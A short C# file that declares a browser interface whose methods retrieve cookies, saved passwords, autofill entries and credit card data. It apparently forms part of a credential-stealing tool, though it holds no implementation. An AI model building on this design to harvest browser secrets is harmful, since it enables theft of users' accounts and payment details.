using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1.Browsers
{
    interface IBrowser
    {
        public string Name { get;}

        public string GetCookies();
        public string GetPassword();
        public string GetAutoFills();
        public string GetCreditCards();
    }
}
